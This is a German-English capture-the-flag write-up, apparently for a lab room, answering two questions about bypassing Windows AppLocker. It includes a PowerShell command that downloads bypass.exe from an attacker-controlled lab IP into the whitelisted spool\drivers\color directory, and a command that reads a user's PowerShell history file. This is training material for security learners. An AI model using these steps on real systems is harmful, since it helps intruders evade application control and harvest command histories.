*AppLocker ist ein Sicherheitsfeature in Windows, das Administratoren ermöglicht, genau zu steuern, welche Anwendungen von Benutzern auf einem Windows-System ausgeführt werden können. Durch die Festlegung von Richtlinien basierend auf Kriterien wie Dateipfad, digitaler Signatur des Herausgebers oder Dateityp können sie sicherstellen, dass nur autorisierte Anwendungen gestartet werden. Dies erhöht die Sicherheit des Systems, indem das Risiko von Malware-Infektionen und nicht autorisierten Programmen minimiert wird.*

Answer the questions below
---

1. There are many ways to bypass AppLocker.

    If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: C:\Windows\System32\spool\drivers\color - This is whitelisted by default. 

    Go ahead and use PowerShell to download an executable of your choice locally, place it in the whitelisted directory and execute it.

    *no answer needed*

    Um eine entsprechende ausführbare Datei hochzuladen:

    `Invoke-WebRequest -Uri 'http://10.9.0.54:8000/bypass.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\bypass.exe'
    `

2. Just like Linux bash, Windows Powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

    Access the file and obtain the flag.

    **flag{xxxxxxxxxxxxxxxxxxxxx}**

   `Get-Content \Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

   